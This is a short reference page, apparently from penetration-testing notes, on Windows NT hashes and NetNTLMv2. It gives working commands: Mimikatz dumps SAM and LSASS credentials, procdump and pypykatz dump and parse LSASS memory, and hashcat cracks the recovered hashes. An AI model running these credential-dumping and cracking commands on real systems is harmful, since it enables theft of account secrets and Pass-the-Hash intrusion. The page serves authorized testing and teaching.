# NT hashes and NetNTLMv2

[← Windows quick reference](../04-windows-privesc.md)

An NT hash from SAM or LSASS can be used for offline cracking and, where NTLM authentication is accepted, Pass the Hash. NetNTLMv2 is a challenge-response blob; crack it to recover the password before deriving an NT hash.

With administrator or SYSTEM access, use a non-interactive Mimikatz invocation under WinRM:

```powershell
.\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

Mimikatz needs the relevant process rights. Modern patched hosts usually return hashes rather than cleartext passwords; WDigest is normally disabled. Verify what the output actually contains.

```bash
hashcat -m 1000 nt.txt /usr/share/wordlists/rockyou.txt
hashcat -m 5600 netntlmv2.txt /usr/share/wordlists/rockyou.txt
```

If process rights permit an LSASS minidump, copy it for offline inspection and remove the copy from the target afterward:

```powershell
procdump -accepteula -ma lsass.exe C:\Windows\Temp\lsass.dmp
```

```bash
pypykatz lsa minidump lsass.dmp
```
